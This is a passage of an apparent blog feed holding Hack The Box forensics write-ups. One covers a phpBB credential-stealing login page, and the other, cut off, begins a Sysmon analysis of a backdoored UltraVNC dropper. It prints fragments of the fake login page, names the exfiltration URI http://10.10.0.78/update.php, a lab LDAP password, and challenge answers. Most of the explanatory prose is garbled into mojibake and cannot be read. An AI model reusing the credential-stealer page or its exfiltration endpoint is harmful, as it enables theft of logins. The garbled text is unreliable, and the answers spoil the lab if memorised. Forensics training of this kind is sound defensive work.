class="hljs-string">&quot;4&quot;</span>&gt;</span>Remember me<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;viewonline&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewonline&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;viewonline&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>Hide my online status this session<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">&quot;6&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button1&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;sethidden()&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br>&lt;/fieldset class=&quot;fields1&quot;&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;page-footer&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page-footer&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;contentinfo&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;navigation&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;nav-footer&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-footer linklist&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menubar&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;breadcrumbs&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;crumb&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.php&quot;</span> <span class="hljs-attr">data-navbar-reference</span>=<span class="hljs-string">&quot;index&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Board index&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-home fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Board index<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;responsive-menu hidden rightside dropdown-container&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0);&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;js-responsive-menu-link responsive-menu-link dropdown-toggle&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-bars fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pointer-inner&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dropdown-contents&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span>&gt;</span>All times are <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;UTC&quot;</span>&gt;</span>UTC<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;rightside&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=delete_cookies&quot;</span> <span class="hljs-attr">data-ajax</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">data-refresh</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-trash fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Delete cookies<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;copyright&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-row&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-copyright&quot;</span>&gt;</span>Powered by <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.phpbb.com/&quot;</span>&gt;</span>phpBB<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>Â® Forum Software Â© phpBB Limited<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-row&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=privacy&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Privacy&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link-text&quot;</span>&gt;</span>Privacy<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> | <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./ucp.php?mode=terms&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Terms&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;menuitem&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer-link-text&quot;</span>&gt;</span>Terms<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;darkenwrapper&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;darkenwrapper&quot;</span> <span class="hljs-attr">data-ajax-error-title</span>=<span class="hljs-string">&quot;AJAX error&quot;</span> <span class="hljs-attr">data-ajax-error-text</span>=<span class="hljs-string">&quot;Something went wrong when processing ysqlite&gt;                                                                                                                                                                                                                                                     &gt;            &lt;div id=&quot;</span> <span class="hljs-attr">darken</span>&quot; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;darken&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;phpbb_alert&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;phpbb_alert&quot;</span> <span class="hljs-attr">data-l-err</span>=<span class="hljs-string">&quot;Error&quot;</span> <span class="hljs-attr">data-l-timeout-processing-req</span>=<span class="hljs-string">&quot;Request timed out.&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_close&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-times-circle fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_title&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;phpbb_confirm&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;phpbb_alert&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_close&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;icon fa-times-circle fa-fw&quot;</span> <span class="hljs-attr">aria-hidden</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert_text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;bottom&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;anchor&quot;</span> <span class="hljs-attr">accesskey</span>=<span class="hljs-string">&quot;z&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./cron.php?cron_type=cron.task.core.tidy_warnings&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;cron&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Greetings everyone,<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> I am just a visiting IT Contractor, it&#x27;s a fantastic company y&#x27;all have here.<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> I hope to work with you all again soon.<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> Regards,<br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>Alex Poole<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é¢„è§ˆå‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µï¼Œä»£ç å®¡è®¡ä¸€ä¸‹ä¼šå‘ç°è¡¨å•ä¼šæŠŠæ•°æ®å‘é€åˆ° <code>http://10.10.0.78/update.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/b2b9ac4d0d6002cc.png"></p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">What is the <span class="hljs-literal">full</span> URI that the credential stealer sends its <span class="hljs-built_in">data</span> <span class="hljs-keyword">to</span>?<br>:http:<span class="hljs-comment">//10.10.0.78/update.php</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>æŸ¥çœ‹ <code>phpbb_log</code> æ‰¾åˆ°ç™»å½•æ—¶é—´ <code>log_time</code> ï¼Œä½†æ˜¯æ—¥å¿—ä¸­æ˜¾ç¤ºçš„æ—¶é—´æ˜¯ Unix æ—¶é—´ï¼ˆä¸æ‡‚è¿™ä¸ªï¼‰ï¼Œå³çºªå…ƒæ ¼å¼ï¼Œå› æ­¤è¿˜éœ€è¦å°†æ—¶é—´è½¬æ¢ä¸º UTCï¼Œ<a href="https://conscioushacker.io/tools/zh-hans/unix-timestamp-to-date">Unix Timestamp to Date</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/070df67570c05911.png"></p><p>å³ <code>Wed, 26 Apr 2023 10:53:12 GMT</code>ï¼Œè½¬æ¢æ ¼å¼ <code>26/04/2023 10:53:12</code></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">When did the contractor log into the forum as the administrator? (UTC)<br><span class="hljs-meta">:26/04/2023 10:53:12</span> <br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>æŸ¥æ‰¾å®˜æ–¹æ–‡æ¡£</p><p><a href="https://www.phpbb.com/support/docs/en/3.3/ug/adminguide/general_client/"><strong>LDAP Authentication</strong></a></p><p><img src="https://img.dkdun.cn/v1/2025/12/965831fc2b6cb3fb.png"></p><p>â€œThis password will be stored as plain text in the database; it will be visible to everybody who can access your databaseâ€ï¼Œè¯´æ˜æ•°æ®åº“ä¸­æœ‰ä¿¡æ¯ï¼ŒæŸ¥çœ‹ <code>phpbb_config</code> é…ç½®æ•°æ®ï¼Œæ‰¾åˆ°äº† <code>ldap_password</code>ï¼ŒPassw0rd1</p><p><img src="https://img.dkdun.cn/v1/2025/12/6db2f634b86b1f19.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> forum there are plaintext credentials <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> LDAP connection, what is <span class="hljs-keyword">the</span> password?<br>:Passw0rd1<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p>ä»å‰é¢å·²ç»çŸ¥é“ <code>10.255.254.2</code> æ˜¯ç®¡ç†å‘˜ IPï¼Œæ‰€ä»¥æŸ¥çœ‹å¯¹åº” IP å°±èƒ½æ‰¾åˆ°äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/240837947d082da3.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">user</span> agent <span class="hljs-keyword">of</span> the Administrator <span class="hljs-keyword">user</span>?<br>:Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>_15_7) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, <span class="hljs-keyword">like</span> Gecko) Chrome/<span class="hljs-number">112.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>æŸ¥çœ‹ <code>phpbb_log</code> èƒ½å‘ç°æœ‰ <code>LOG_USERS_ADDED</code> ï¼Œæ—¶é—´è½¬åŒ–åä¸ºï¼š<code>26/04/2023 10:53:51</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/28bfb628f2115b6f.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> contractor <span class="hljs-built_in">add</span> themselves <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> Administrator group? (UTC)<br>:<span class="hljs-number">26</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2023</span> <span class="hljs-number">10</span>:<span class="hljs-number">53</span>:<span class="hljs-number">51</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>å¯ä»¥çœ‹åˆ° IP <code>10.10.0.78</code> åœ¨ <code>26/04/2023 12:01:38</code> è¿›è¡Œäº†ä¸€ä¸ª <code>/store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz</code>è¡Œä¸ºï¼Œä¸‹è½½äº†æ•°æ®åº“ï¼Œå› ä¸ºæ˜¯ UTC æ—¶é—´ï¼Œæ‰€ä»¥å‡å» 1 å°æ—¶å°±æ­£ç¡®äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/84fc98234eaaf064.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What <span class="hljs-built_in">time</span> did <span class="hljs-keyword">the</span> contractor download <span class="hljs-keyword">the</span> database backup? (UTC)<br>:<span class="hljs-number">26</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2023</span> <span class="hljs-number">11</span>:<span class="hljs-number">01</span>:<span class="hljs-number">38</span><br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><p>ç›´æ¥æ‰¾åˆ°å¯¹åº”æ—¶é—´æŸ¥çœ‹å¤§å°</p><p><img src="https://img.dkdun.cn/v1/2025/12/49e7036594ce2199.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What was <span class="hljs-keyword">the</span> size <span class="hljs-keyword">in</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> database backup <span class="hljs-keyword">as</span> stated <span class="hljs-keyword">by</span> access.<span class="hljs-built_in">log</span>?<br>:<span class="hljs-number">34707</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>å¤§è‡´äº†è§£äº†ä¸€ä¸‹</p><p>LDAPï¼ˆLightweight Directory Access Protocolï¼‰ï¼Œæ˜¯ä¸€ä¸ªè½»é‡çº§ç›®å½•è®¿é—®<strong>åè®®</strong>ï¼Œæ˜¯ä¸€ç§è¿è¡Œäº TCP&#x2F;IP ä¹‹ä¸Šçš„åœ¨çº¿ç›®å½•è®¿é—®åè®®ï¼Œä¸»è¦ç”¨äºç›®å½•ä¸­èµ„æºçš„æœç´¢å’ŒæŸ¥è¯¢ã€‚ä½¿ç”¨æœ€å¹¿æ³›çš„ LDAP æœåŠ¡å¦‚å¾®è½¯çš„ ADAM(Active Directory Application Mode) å’Œ OpenLDAPï¼Œ é‡ç‚¹æ˜¯åè®®ã€‚LDAPç›¸å…³çš„åè®®å¾ˆå¤šï¼Œ X.500ï¼ˆåŸå§‹ç›®å½•è®¿é—®åè®®ï¼‰ï¼ŒLDAP æ˜¯å…¶æ›´è½»é‡çº§çš„ç‰ˆæœ¬ã€‚</p><p>æ›´å¤šè¯¦ç»†çš„å¯ä»¥çœ‹ï¼š <a href="https://www.rfc-editor.org/rfc/pdfrfc/rfc4510.txt.pdf">LDAP ç³»åˆ—åè®®</a>ï¼Œ<a href="https://www.okta.com/identity-101/what-is-ldap/">What Is LDAP &amp; How Does It Work?</a>ï¼Œ<a href="https://ldap.com/basic-ldap-concepts/">Basic LDAP Concepts</a></p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Unit42</title>
    <link href="/2025/03/26/HTB-Unit42/"/>
    <url>/2025/03/26/HTB-Unit42/</url>
    
    <content type="html"><![CDATA[<p>Level ï¼šVery Easy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>In this Sherlock, you will familiarize yourself with Sysmon logs and various useful EventIDs for identifying and analyzing malicious activities on a Windows system. Palo Altoâ€™s Unit42 recently conducted research on an UltraVNC campaign, wherein attackers utilized a backdoored version of UltraVNC to maintain access to systems. This lab is inspired by that campaign and guides participants through the initial access stage of the campaign.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>ç”¨ Windows è‡ªå¸¦çš„æ—¶é—´æŸ¥çœ‹å™¨æ‰“å¼€ï¼Œç­›é€‰ä¸€ä¸‹ ID å°±çŸ¥é“äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/641ff42c61e7a890.png"></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">How many <span class="hljs-keyword">Event</span> logs are there <span class="hljs-keyword">with</span> <span class="hljs-keyword">Event</span> ID <span class="hljs-number">11</span>?<br>:<span class="hljs-number">56</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>ç­›é€‰äº‹ä»¶ ID ä¸º 1 çš„æ—¥å¿—ï¼Œä¸€ä¸ªä¸€ä¸ªæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥å‘ç°ä¸‹è½½äº† <code>Preventivo24.02.14.exe.exe</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/270fc11326e69cee.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Whenever a process <span class="hljs-keyword">is</span> created <span class="hljs-keyword">in</span> memory, an event <span class="hljs-keyword">with</span> Event ID <span class="hljs-number">1</span> <span class="hljs-keyword">is</span> recorded <span class="hljs-keyword">with</span> details such <span class="hljs-keyword">as</span> command <span class="hljs-type">line</span>, hashes, process <span class="hljs-type">path</span>, parent process <span class="hljs-type">path</span>, etc. This information <span class="hljs-keyword">is</span> very useful <span class="hljs-keyword">for</span> an analyst because it allows us <span class="hljs-keyword">to</span> see <span class="hljs-keyword">all</span> programs executed <span class="hljs-keyword">on</span> a <span class="hljs-keyword">system</span>, which means we can spot <span class="hljs-keyword">any</span> malicious processes being executed. What <span class="hljs-keyword">is</span> the malicious process that infected the victim<span class="hljs-string">&#x27;s system</span><br><span class="hljs-string">:C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe</span><br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>ç­›é€‰ DNS äº‹ä»¶ï¼ŒID ä¸º 22ï¼Œå¯ç”¨äºæŸ¥æ‰¾ç³»ç»Ÿå‘å‡ºçš„ä»»ä½• DNS æŸ¥è¯¢</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4958e0776ec3034.png"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">Which Cloud drive was used <span class="hljs-selector-tag">to</span> distribute the malware?<br><span class="hljs-selector-pseudo">:drop</span>box<br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>ç­›é€‰ ID ä¸º 2 